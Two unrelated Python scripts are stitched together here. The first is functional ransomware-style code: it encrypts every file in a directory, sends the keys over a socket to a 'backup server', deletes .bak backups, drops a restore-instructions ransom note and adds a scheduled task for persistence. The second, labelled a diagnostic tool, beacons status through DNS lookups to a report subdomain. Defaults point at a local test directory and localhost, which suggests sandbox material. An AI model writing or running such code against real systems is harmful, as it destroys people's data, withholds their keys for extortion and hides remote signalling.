import os
import time
import subprocess
from hashlib import sha256
from secrets import token_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from socket import socket, AF_INET, SOCK_STREAM

DEFAULT_DIRECTORY = './test_directory'
DEFAULT_BACKUP_SERVER = ('localhost', 9000)
DEFAULT_INTERVAL = 0
DEFAULT_ITERATIONS = 1
LOG_FILE = './encryption_log.txt'

def log_message(message):
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
    print(message)

def generate_key(file_path):
    salt = token_bytes(16)
    return sha256(file_path.encode('utf-8') + salt).digest()

def encrypt_file(file_path, encryption_keys, backup_server):
    key = generate_key(file_path)
    iv = token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    encryptor = cipher.encryptor()

    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()

        with open(file_path, 'wb') as f:
            f.write(iv)
            f.write(ciphertext)

        log_message(f"Encrypted: {file_path}")
        encryption_keys[file_path] = key
        send_key_to_backup_server(file_path, key, backup_server)
    except Exception as e:
        log_message(f"Failed to encrypt {file_path}: {e}")

def send_key_to_backup_server(file_path, key, backup_server, max_retries=5):
    retries = 0
    while retries < max_retries:
        try:
            with socket(AF_INET, SOCK_STREAM) as s:
                s.connect(backup_server)
                message = f"{file_path}:{key.hex()}"
                s.sendall(message.encode('utf-8'))
                log_message(f"Sent encryption key for {file_path} to backup server.")
                return
        except Exception as e:
            retries += 1
            backoff = 2 ** retries
            log_message(f"Failed to send key for {file_path}, retrying in {backoff}s: {e}")
            time.sleep(backoff)
    log_message(f"Failed to send key for {file_path} after {max_retries} retries. Proceeding without backup.")

def create_restore_instructions(directory):
    instructions = (
        "Your files have been encrypted using AES-256 encryption.\n"
        "To retrieve the encryption keys, please contact the administrator at:\n"
        "support@example.com\n"
        "Provide the file names and your contact details.\n"
    )
    restore_file_path = os.path.join(directory, 'RESTORE_INSTRUCTIONS.txt')
    try:
        with open(restore_file_path, 'w') as f:
            f.write(instructions)
        log_message(f"Created restore instructions: {restore_file_path}")
    except Exception as e:
        log_message(f"Failed to create restore instructions: {e}")

def create_scheduled_task():
    try:
        script_path = os.path.abspath(__file__)
        task_name = "EncryptFilesTask"

        command = f'schtasks /Create /SC ONCE /TN "{task_name}" /TR "{script_path}" /ST 00:00 /F'
        subprocess.run(command, shell=True, check=True)
        log_message(f"Scheduled task created: {task_name}")
    except Exception as e:
        log_message(f"Failed to create scheduled task: {e}")

def process_directory(directory, backup_server):
    if not os.path.isdir(directory):
        log_message(f"Error: {directory} is not a valid directory.")
        return

    encryption_keys = {}
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith('.bak'):
                try:
                    os.remove(file_path)
                    log_message(f"Deleted: {file_path}")
                except Exception as e:
                    log_message(f"Failed to delete {file_path}: {e}")
            else:
                encrypt_file(file_path, encryption_keys, backup_server)

    create_restore_instructions(directory)

def cleanup_old_logs():
    try:
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
            print(f"Old log file removed: {LOG_FILE}")
    except Exception as e:
        print(f"Failed to remove old log file: {e}")

def main():
    directory = DEFAULT_DIRECTORY
    backup_server = DEFAULT_BACKUP_SERVER
    interval = DEFAULT_INTERVAL
    iterations = DEFAULT_ITERATIONS

    cleanup_old_logs()
    create_scheduled_task()

    for _ in range(iterations):
        process_directory(directory, backup_server)
        if interval > 0:
            time.sleep(interval)

if __name__ == "__main__":
    main()

#!/usr/bin/env python3

import sys
import socket
import os
import time
from datetime import datetime

STATUS_FILE_DIR = "./target"
STATUS_FILE_PATH = os.path.join(STATUS_FILE_DIR, "diagnostic_status.txt")
DEFAULT_INTERVAL = 60  # in seconds
DEFAULT_ITERATION_COUNT = 1
BACKOFF_TIME = 5  # in seconds
MAX_RETRIES = 3

def resolve_domain(domain_name):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            ip_address = socket.gethostbyname(domain_name)
            return ip_address
        except socket.gaierror:
            retries += 1
            print(f"Failed to resolve domain: {domain_name}. Retrying in {BACKOFF_TIME} seconds...")
            time.sleep(BACKOFF_TIME)
    return None

def write_status(domain_name, ip_address):
    try:
        if not os.path.exists(STATUS_FILE_DIR):
            os.makedirs(STATUS_FILE_DIR)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status_message = f"Timestamp: {timestamp}, Domain: {domain_name}, IP: {ip_address or 'Resolution Failed'}\n"

        with open(STATUS_FILE_PATH, "a") as status_file:
            status_file.write(status_message)
    except OSError as e:
        print(f"Failed to write status file: {e}")
        sys.exit(1)

def report_to_server(domain_name, ip_address):
    try:
        # Simulating reporting via DNS query to a remote server
        reporting_domain = f"report.{domain_name}"
        socket.gethostbyname(reporting_domain)
        print(f"Reported status to server for domain: {domain_name} (IP: {ip_address})")
    except socket.gaierror:
        print(f"Failed to report status to server for domain: {domain_name}")

def run_diagnostic(domain_name, interval, iteration_count):
    for _ in range(iteration_count):
        ip_address = resolve_domain(domain_name)

        if ip_address:
            print(f"Resolved IP address for {domain_name}: {ip_address}")
        else:
            print(f"Failed to resolve domain: {domain_name}")

        write_status(domain_name, ip_address)
        report_to_server(domain_name, ip_address)

        if iteration_count > 1:
            time.sleep(interval)

def register_service(domain_name, interval=DEFAULT_INTERVAL, iteration_count=DEFAULT_ITERATION_COUNT):
    print(f"Registering service to periodically query domain: {domain_name}")
    run_diagnostic(domain_name, interval, iteration_count)

def main():
    if len(sys.argv) < 2:
        print("Usage: diagnostic_tool.bin <domain_name> [--interval <seconds>] [--iterations <count>]")
        sys.exit(1)

    domain_name = sys.argv[1]
    interval = DEFAULT_INTERVAL
    iteration_count = DEFAULT_ITERATION_COUNT

    if "--interval" in sys.argv:
        try:
            interval_index = sys.argv.index("--interval") + 1
            interval = int(sys.argv[interval_index])
        except (ValueError, IndexError):
            print("Invalid interval value. Using default interval.")

    if "--iterations" in sys.argv:
        try:
            iteration_index = sys.argv.index("--iterations") + 1
            iteration_count = int(sys.argv[iteration_index])
        except (ValueError, IndexError):
            print("Invalid iteration count. Using default value.")

    register_service(domain_name, interval, iteration_count)

if __name__ == "__main__":
    main()

